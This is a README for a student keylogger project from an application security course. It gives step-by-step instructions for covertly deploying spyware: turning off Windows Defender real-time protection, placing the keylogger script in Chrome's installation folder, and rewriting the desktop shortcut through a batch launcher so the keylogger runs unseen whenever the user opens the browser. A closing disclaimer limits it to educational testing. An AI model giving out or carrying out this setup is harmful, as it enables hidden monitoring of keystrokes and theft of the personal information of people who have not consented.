# Keylogger - Application and System Security

## Overview

Keylogger is a research topic in the **Application and System Security** course, focusing on studying and developing spyware that monitors user keystrokes to capture personal information.

## Requirements

Before running the program, ensure the following:

- **Disable security software** (Windows Defender, Antivirus, etc.)
- **Install Python** (if not already installed)
- **Install required libraries**:
  ```sh
  pip install pynput
  ```

---

## Installation & Setup Guide

### **Step 1: Disable Security Software (For Testing Purposes Only)**

1. Open **Windows Security** → Navigate to **Virus & Threat Protection**.
2. Temporarily disable **Real-time Protection** to prevent interference.

### **Step 2: Locate the Target Application's Installation Folder**

1. Right-click on the **shortcut** of an application (e.g., Chrome).
2. Select **Open file location** to access the folder containing the application's executable file.

### **Step 3: Move Keylogger Files to the Application Folder**

1. Copy the following files into the **application's folder** (e.g., the folder containing `chrome.exe`):
   - `Keylog_V2.pyw`
   - `Launcher.bat`

### **Step 4: Modify **``** to Launch Keylogger**

1. Right-click on `Launcher.bat` → Select **Edit in Notepad**.
2. Add the following lines to execute both the application and the keylogger:
   ```bat
   start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
   start "" "C:\Program Files\Google\Chrome\Application\Keylog_V2.pyw"
   ```
3. Save and close the file.

### **Step 5: Update the Application Shortcut**

1. Return to the **Desktop**, right-click on the **application shortcut**.
2. Select **Properties** → Locate the **Target** field.
3. Replace the target path with the location of `Launcher.bat`.
4. Click **Apply** → **OK** to save the changes.

---

## Execution

Now, whenever the user **launches the application** (e.g., Chrome) using the **modified shortcut**, the Keylogger will also be executed simultaneously.

> **Disclaimer:** This setup is strictly for educational and testing purposes in a controlled environment. Unauthorized use may violate privacy laws.

---

